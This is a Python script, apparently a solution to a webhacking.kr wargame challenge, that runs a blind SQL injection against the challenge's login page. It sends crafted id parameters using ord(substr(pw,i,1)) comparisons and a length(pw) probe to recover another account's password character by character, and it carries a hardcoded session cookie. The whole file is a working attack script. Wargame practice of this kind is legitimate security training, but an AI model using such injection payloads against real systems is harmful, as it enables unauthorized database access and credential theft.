import requests
import string

url="https://webhacking.kr/challenge/bonus-1/index.php"
cookies={'PHPSESSID':"37v8ck34evjq30uihltmdorh0h"}
ascii_code=string.digits+string.ascii_letters


def findString():
    password = ""

    for i in range(1, 37):
        print("{}번 째 문자 시작".format(i))

        for j in range(0, 256):
            params=f"?id=' or (id!='guest' and ord(substr(pw,{i},1))={j})%23&pw=1234"
            find_url=url+params
            response=requests.get(find_url, cookies=cookies)
            if response.text.find("wrong password</b>")>0:
                password+=chr(j)
                print("찾은 PW : ", password)
                print("찾은 URL : ", find_url)
        password+="/"

    print(f"찾은 값은 : {password}")
    print("\n완료~")


def findPassLen():

    for i in range(1, 100):
        params = f"?id=' or length(pw)={i}%23&pw=1234"
        find_url = url + params
        response = requests.get(find_url, cookies=cookies)
        if response.text.find("wrong password</b>") > 0:
            print("찾은 URL : ", find_url)

#__main__
#findPassLen()
findString()
